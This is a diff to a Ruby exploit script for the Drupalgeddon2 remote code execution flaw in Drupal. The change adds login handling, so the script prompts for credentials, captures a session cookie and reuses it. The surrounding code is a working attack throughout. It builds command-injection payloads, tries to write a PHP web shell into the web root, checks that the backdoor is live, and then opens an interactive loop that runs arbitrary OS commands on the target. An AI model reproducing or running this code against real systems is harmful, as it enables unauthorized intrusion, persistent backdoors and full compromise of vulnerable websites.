@@ -38,7 +38,7 @@ bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
 
 
 # Function http_request <url> [type] [data]
-def http_request(url, type="get", payload="")
+def http_request(url, type="get", payload="", cookie="")
   puts verbose("HTTP - URL : #{url}") if $verbose
   puts verbose("HTTP - Type: #{type}") if $verbose
   puts verbose("HTTP - Data: #{payload}") if not payload.empty? and $verbose
@@ -47,6 +47,7 @@ def http_request(url, type="get", payload="")
     uri = URI(url)
     request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
     request.initialize_http_header({"User-Agent" => $useragent})
+    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
     request.body = payload if not payload.empty?
     return $http.request(request)
   rescue SocketError
@@ -91,7 +92,7 @@ def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
 
   # Drupal v7.x needs an extra value from a form
   if $drupalverion.start_with?("7")
-    response = http_request(url, "post", payload)
+    response = http_request(url, "post", payload, $session_cookie)
 
     form_name = "form_build_id"
     puts verbose("Form name  : #{form_name}") if $verbose
@@ -176,22 +177,34 @@ end
 
 
 # Quick how to use
-if ARGV.empty?
-  puts "Usage: ruby drupalggedon2.rb <target> [--verbose]"
-  puts "       ruby drupalgeddon2.rb https://example.com"
+if ARGV.empty? or ARGV.length < 2
+  puts 'Usage: ruby drupalggedon2.rb <target> <authentication?yes|no> [--verbose]'
+  puts 'Example for target that does not require authentication:'
+  puts '       ruby drupalgeddon2.rb https://example.com no'
+  puts 'Example for target that does require authentication:'
+  puts '       ruby drupalgeddon2.rb https://example.com yes'
   exit
 end
 
 require 'highline/import'
 
 $verbose = false
-if ARGV.length == 2 and ARGV[1] == '--verbose'
+if ARGV.length == 3 and ARGV[2] == '--verbose'
   # Settings - Output
   $verbose = true
 end
 
 # Read in values
 $target = ARGV[0]
+
+if ARGV[1] == 'yes'
+  $uname = ask('Enter your username:  ') { |q| q.echo = false }
+  $passwd = ask('Enter your password:  ') { |q| q.echo = false }
+  $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
+  $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }
+  $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
+  $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
+end
 
 
 # Check input for protocol
@@ -226,6 +239,17 @@ if uri.scheme == "https"
   $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 end
 
+$session_cookie = ''
+# If authentication required then login and get session cookie
+if $uname
+  $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix
+  response = http_request($target + $login_path, 'post', $payload, $session_cookie)
+  if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']
+    $session_cookie = response['set-cookie'].split('; ')[0]
+    puts success("Logged in - Session Cookie : #{$session_cookie}")
+  end
+
+end
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
@@ -263,7 +287,7 @@ url = [
 # Check all
 url.each do|uri|
   # Check response
-  response = http_request(uri)
+  response = http_request(uri, 'get', '', $session_cookie)
 
   # Check header
   if response['X-Generator'] and $drupalverion.empty?
@@ -372,7 +396,7 @@ $form = $drupalverion.start_with?("8")? "user/register" : "user/password"
 # Make a request, check for form
 url = "#{$target}?q=#{$form}"
 puts action("Testing: Form   (#{$form})")
-response = http_request(url)
+response = http_request(url, 'get', '', $session_cookie)
 if response.code == "200" and not response.body.empty?
   puts success("Result : Form valid")
 elsif response['location']
@@ -401,7 +425,7 @@ $clean_url = $drupalverion.start_with?("8")? "" : "?q="
 url = "#{$target}#{$form}"
 
 puts action("Testing: Clean URLs")
-response = http_request(url)
+response = http_request(url, 'get', '', $session_cookie)
 if response.code == "200" and not response.body.empty?
   puts success("Result : Clean URLs enabled")
 else
@@ -445,7 +469,7 @@ elements.each do|e|
   random = (0...8).map { (65 + rand(26)).chr }.join
   url, payload = gen_evil_url("echo #{random}", e)
 
-  response = http_request(url, "post", payload)
+  response = http_request(url, "post", payload, $session_cookie)
   if (response.code == "200" or response.code == "500") and not response.body.empty?
     result = clean_result(response.body)
     if not result.empty?
@@ -506,7 +530,7 @@ paths.each do|path|
   # Check to see if there is already a file there
   puts action("Testing: Existing file   (#{$target}#{path}#{webshell})")
 
-  response = http_request("#{$target}#{path}#{webshell}")
+  response = http_request("#{$target}#{path}#{webshell}", 'get', '', $session_cookie)
   if response.code == "200"
     puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***")
   else
@@ -538,7 +562,7 @@ paths.each do|path|
   # Generate evil URLs
   url, payload = gen_evil_url(cmd, $element)
   # Make the request
-  response = http_request(url, "post", payload)
+  response = http_request(url, "post", payload, $session_cookie)
   # Check result
   if response.code == "200" and not response.body.empty?
     # Feedback
@@ -546,7 +570,7 @@ paths.each do|path|
     puts success("Result : #{result}") if not result.empty?
 
     # Test to see if backdoor is there (if we managed to write it)
-    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname")
+    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname", $session_cookie)
     if response.code == "200" and not response.body.empty?
       puts success("Very Good News Everyone! Wrote to the web root! Waayheeeey!!!")
       break
@@ -627,11 +651,11 @@ loop do
   # If PHP web shell
   if not webshellpath.empty?
     # Send request
-    result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
+    result = http_request("#{$target}#{webshell}", "post", "c=#{command}", $session_cookie).body
   # Direct OS commands
   else
     url, payload = gen_evil_url(command, $element, true)
-    response = http_request(url, "post", payload)
+    response = http_request(url, "post", payload, $session_cookie)
 
     # Check result
     if not response.body.empty?
